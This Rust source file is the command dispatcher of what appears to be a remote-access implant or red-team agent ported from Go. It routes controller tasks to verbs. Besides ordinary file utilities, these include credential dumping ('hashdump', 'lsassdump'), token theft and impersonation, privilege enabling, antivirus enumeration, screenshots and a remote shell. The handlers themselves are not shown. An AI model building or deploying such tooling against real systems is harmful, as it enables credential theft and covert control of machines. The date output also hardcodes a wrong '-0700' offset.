//! Native "extra" verb dispatcher.
//!
//! Replaces `native_extra.go`'s `isNativeExtraVerb` and
//! `Agent.nativeExtraVerb`. Thirty verbs live in sibling files;
//! the remaining twenty are platform-specific and route through
//! `native::*` (see `native/mod.rs`).

pub mod encoding;
pub mod file;
pub mod flags;
pub mod fs_ops;
pub mod hash;
pub mod network;
pub mod path;
pub mod search;
pub mod shell;
pub mod text;

use crate::core::agent::Agent;
use crate::core::helpers::encode_output;
use crate::native;
use crate::protocol::{Task, TaskResult};

/// Whether `verb` is dispatched through this module.
///
/// Enumerates exactly the 50 verbs the Go `nativeExtraVerbs` map
/// listed.
pub fn is_native_extra_verb(verb: &str) -> bool {
    matches!(
        verb,
        // file.rs
        "find" | "grep" | "head" | "tail" | "stat" | "strings"
            | "hexdump"
        // hash.rs
        | "sha1" | "sha256" | "md5" | "cksum"
        // text.rs
        | "wc" | "nl" | "rev" | "sort" | "uniq" | "tr"
        // encoding.rs
        | "base64" | "gzip" | "gunzip"
        // path.rs
        | "which" | "readlink" | "realpath" | "du"
        // fs_ops.rs
        | "mkdir" | "rm" | "cp" | "mv" | "chmod" | "ln" | "touch"
        // network.rs
        | "curl" | "resolve" | "nc" | "ifconfig"
        // shell.rs
        | "shell"
        // Platform-specific, dispatched via native::*
        | "df" | "uptime" | "date" | "getpid" | "getppid"
        | "screenshot" | "netstat" | "arp" | "route"
        | "users" | "groups" | "av-list"
        | "hashdump" | "enablepriv" | "lsassdump"
        | "make_token" | "runas" | "rev2self"
    )
}

/// Dispatch `task` to the verb that handles it.
///
/// `agent` is `&mut` because `shell` mutates `agent.shell`.
/// Every other verb only reads from `agent` (or from nowhere).
pub async fn native_extra_verb(
    agent: &mut Agent,
    task: &Task,
) -> TaskResult {
    match task.verb.as_str() {
        // ---- file.rs ---------------------------------------------
        "find" => search::find(task).await,
        "grep" => search::grep(task).await,
        "head" => file::head(task).await,
        "tail" => file::tail(task).await,
        "stat" => file::stat(task).await,
        "strings" => file::strings(task).await,
        "hexdump" => file::hexdump(task).await,

        // ---- hash.rs ---------------------------------------------
        "sha1" => hash::hash(task, hash::Algo::Sha1).await,
        "sha256" => hash::hash(task, hash::Algo::Sha256).await,
        "md5" => hash::hash(task, hash::Algo::Md5).await,
        "cksum" => hash::cksum(task).await,

        // ---- text.rs ---------------------------------------------
        "wc" => text::wc(task).await,
        "nl" => text::nl(task).await,
        "rev" => text::rev(task).await,
        "sort" => text::sort(task).await,
        "uniq" => text::uniq(task).await,
        "tr" => text::tr(task).await,

        // ---- encoding.rs -----------------------------------------
        "base64" => encoding::base64(task).await,
        "gzip" => encoding::gzip(task, true).await,
        "gunzip" => encoding::gzip(task, false).await,

        // ---- path.rs ---------------------------------------------
        "which" => path::which(task).await,
        "readlink" => path::readlink(task).await,
        "realpath" => path::realpath(task).await,
        "du" => path::du(task).await,

        // ---- fs_ops.rs -------------------------------------------
        "mkdir" => fs_ops::mkdir(task).await,
        "rm" => fs_ops::rm(task).await,
        "cp" => fs_ops::cp(task).await,
        "mv" => fs_ops::mv(task).await,
        "chmod" => fs_ops::chmod(task).await,
        "ln" => fs_ops::ln(task).await,
        "touch" => fs_ops::touch(task).await,

        // ---- network.rs ------------------------------------------
        "curl" => network::curl(task).await,
        "resolve" => network::resolve(task).await,
        "nc" => network::nc(task).await,
        "ifconfig" => network::ifconfig(task).await,

        // ---- shell.rs --------------------------------------------
        "shell" => shell::shell(agent, task).await,

        // ---- Inline verbs ----------------------------------------
        "date" => {
            let now = chrono::Local::now();
            let out = format!(
                "local: {}\nutc:   {}\n",
                now.format("%Y-%m-%d %H:%M:%S %Z -0700"),
                now.with_timezone(&chrono::Utc)
                    .format("%Y-%m-%d %H:%M:%S UTC -0700"),
            );
            simple(task, out.as_bytes())
        }
        "getpid" => simple(
            task,
            format!("{}\n", std::process::id()).as_bytes(),
        ),
        "getppid" => simple(
            task,
            format!("{}\n", platform_ppid()).as_bytes(),
        ),

        // ---- Delegated to native::* ------------------------------
        "df" => native_result(task, native::native_df(&task.args).await),
        "uptime" => native_result(task, native::native_uptime().await),
        "netstat" => native_result(task, native::native_netstat().await),
        "arp" => native_result(task, native::native_arp().await),
        "route" => native_result(task, native::native_route().await),
        "users" => native_result(task, native::native_users().await),
        "groups" => native_result(task, native::native_groups().await),
        "av-list" => {
            native_result(task, native::native_av_list().await)
        }
        "hashdump" => {
            native_result(task, native::native_hashdump(task).await)
        }
        "enablepriv" => {
            native_result(task, native::native_enable_priv(task).await)
        }
        "lsassdump" => {
            native_result(task, native::native_lsass_dump(task).await)
        }
        "make_token" => {
            native_result(task, native::native_make_token(task).await)
        }
        "runas" => {
            native_result(task, native::native_runas(task).await)
        }
        "rev2self" => {
            native_result(task, native::native_rev2self(task).await)
        }
        "screenshot" => {
            native_result(task, native::native_screenshot(task).await)
        }

        other => TaskResult {
            id: task.id.clone(),
            error: Some(format!("unknown native verb: {other}")),
            ..Default::default()
        },
    }
}

fn simple(task: &Task, payload: &[u8]) -> TaskResult {
    TaskResult {
        id: task.id.clone(),
        output: encode_output(payload),
        ..Default::default()
    }
}

fn native_result(
    task: &Task,
    r: Result<String, String>,
) -> TaskResult {
    match r {
        Ok(out) => simple(task, out.as_bytes()),
        Err(e) => TaskResult {
            id: task.id.clone(),
            error: Some(e),
            ..Default::default()
        },
    }
}

#[cfg(unix)]
fn platform_ppid() -> u32 {
    // nix's `getppid` is authoritative and handles re-parenting
    // correctly (it reads from the kernel each call).
    nix::unistd::getppid().as_raw() as u32
}

#[cfg(windows)]
fn platform_ppid() -> u32 {
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32First, Process32Next,
        PROCESSENTRY32, TH32CS_SNAPPROCESS,
    };
    unsafe {
        let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        else {
            return 0;
        };
        let me = std::process::id();
        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };
        let mut ppid = 0u32;
        if Process32First(snap, &mut entry).is_ok() {
            loop {
                if entry.th32ProcessID == me {
                    ppid = entry.th32ParentProcessID;
                    break;
                }
                if Process32Next(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snap);
        ppid
    }
}

#[cfg(not(any(unix, windows)))]
fn platform_ppid() -> u32 {
    0
}